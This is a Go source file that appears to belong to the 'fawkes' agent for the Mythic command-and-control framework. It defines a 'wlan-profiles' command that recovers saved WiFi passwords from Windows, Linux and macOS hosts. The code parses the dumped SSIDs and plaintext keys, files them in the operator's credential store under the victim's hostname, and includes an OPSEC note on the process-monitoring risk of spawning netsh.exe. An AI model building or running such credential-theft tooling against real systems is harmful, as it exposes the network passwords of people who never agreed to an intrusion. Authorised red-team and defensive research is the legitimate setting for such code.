package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "wlan-profiles",
		Description:         "Recover saved WiFi network profiles and credentials. Windows: WLAN API (plaintext keys). Linux: NetworkManager/wpa_supplicant/iwd configs. macOS: Keychain.",
		HelpString:          "wlan-profiles\nwlan-profiles -name HomeNetwork",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1555"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "name",
				CLIName:          "name",
				ModalDisplayName: "SSID Filter",
				Description:      "Filter by network name (optional)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			// Parse WiFi profiles table: "SSID          Auth       Cipher   Key                     Source"
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			for _, line := range strings.Split(responseText, "\n") {
				line = strings.TrimSpace(line)
				// Skip headers, separators, and summary lines
				if line == "" || strings.HasPrefix(line, "[*]") || strings.HasPrefix(line, "---") ||
					strings.HasPrefix(line, "SSID") {
					continue
				}
				// Table columns are space-aligned; extract SSID and key
				fields := strings.Fields(line)
				if len(fields) < 4 {
					continue
				}
				ssid := fields[0]
				key := fields[3]
				if key == "(none/open)" || key == "" {
					continue
				}
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: "password",
					Realm:          fmt.Sprintf("WiFi (%s)", hostname),
					Account:        ssid,
					Credential:     key,
					Comment:        "wlanprofiles",
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			name, _ := taskData.Args.GetStringArg("name")
			msg := "OPSEC WARNING: Extracting WiFi profile credentials via netsh wlan show profile. "
			if name != "" {
				msg += fmt.Sprintf("Targeting profile '%s'. ", name)
			}
			msg += "Retrieves plaintext WiFi passwords stored on the system. Spawns netsh.exe which may be logged by process monitoring."
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			display := "list"
			name, _ := taskData.Args.GetStringArg("name")
			if name != "" {
				display += fmt.Sprintf(" %s", name)
			}
			response.DisplayParams = &display
			return response
		},
	})
}
